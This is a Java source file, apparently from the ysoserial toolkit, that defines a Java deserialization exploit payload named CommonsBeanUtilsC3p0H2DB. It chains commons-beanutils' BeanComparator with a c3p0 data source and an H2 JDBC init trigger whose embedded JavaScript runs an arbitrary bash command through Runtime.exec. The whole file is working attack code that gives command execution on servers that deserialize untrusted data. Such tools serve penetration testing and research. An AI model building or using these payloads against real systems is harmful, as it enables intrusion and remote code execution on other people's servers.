package ysoserial.payloads;

import com.mchange.v2.c3p0.ComboPooledDataSource;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.math.BigInteger;
import java.util.Collections;
import java.util.PriorityQueue;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({ Authors.FROHOFF })

@SuppressWarnings("SameParameterValue")
public class CommonsBeanUtilsC3p0H2DB implements ObjectPayload<Object> {

    @SuppressWarnings("DuplicatedCode")
    public Object getObject(final String command) throws Exception {
        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(['bash', '-c', '" + command +"'])";

        String jdbcURL = "jdbc:h2:mem:test;MODE=MSSQLServer;" +
            "init=CREATE TRIGGER cmdExec BEFORE SELECT ON INFORMATION_SCHEMA.USERS AS $$" +
            javascript + " $$";


        // create a ComboPooledDataSource object, holding the JDBC string passed through the command param
        ComboPooledDataSource dataSource = new ComboPooledDataSource();
        dataSource.setInitialPoolSize(1);
        dataSource.setMinPoolSize(0);
        dataSource.setMaxPoolSize(1);
        dataSource.setAcquireRetryAttempts(0);
        dataSource.setJdbcUrl(jdbcURL);

        // mock method name until armed
        final BeanComparator<Object> beanComparator = new BeanComparator<>(null, Collections.reverseOrder());

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> priorityQueue = new PriorityQueue<>(2, beanComparator);
        // stub data for replacement later
        priorityQueue.add(new BigInteger("1"));
        priorityQueue.add(new BigInteger("1"));

        // switch method called by comparator to "getConnection"
        Reflections.setFieldValue(beanComparator, "property", "connection");

        Reflections.setFieldValue(priorityQueue, "queue", new Object[]{dataSource, dataSource});

        return priorityQueue;
    }

    public static void main(final String[] args) throws Exception {

        PayloadRunner.run(CommonsBeanUtilsC3p0H2DB.class, args);
    }

}
